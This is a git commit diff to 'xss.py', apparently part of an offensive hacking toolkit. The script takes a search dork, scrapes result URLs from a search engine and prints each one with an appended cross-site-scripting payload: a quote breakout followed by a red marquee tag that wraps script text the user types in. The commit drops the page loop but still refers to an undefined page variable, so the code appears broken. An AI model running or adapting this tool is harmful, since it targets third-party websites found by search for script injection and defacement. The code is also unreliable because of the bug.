6b303259f62432bcb323721f038b4396e356ff6f
Fajar Firdaus <35714197+FajarTheGGman@users.noreply.github.com>
2019-08-21 17:46:37 +0700

    Update xss.py

--- content/xss.py
+++ content/xss.py
@@ -7,10 +7,9 @@ class Xss:
     def main():
         user_dork = str(input("[Input Dork] >_ "))
         req = url.PoolManager()
-        for page in range(4):
-            send = req.request("GET", "http://www1.search-results.com/web?q=" + user_dork + "&page=" + str(page))
-            parser = BeautifulSoup(send.data, features="lxml")
-            for link in parser.find_all('cite'):
-                result = link.string
-                x = str(input("[Input Script] >_ "))
-                print(str(result) + "'" + "<marquee style='background:red'>" + x + "</marquee>")
+        send = req.request("GET", "http://www1.search-results.com/web?q=" + user_dork + "&page=" + str(page))
+        parser = BeautifulSoup(send.data, features="lxml")
+        for link in parser.find_all('cite'):
+            result = link.string
+            x = str(input("[Input Script] >_ "))
+            print(str(result) + "'" + "<marquee style='background:red'>" + x + "</marquee>")
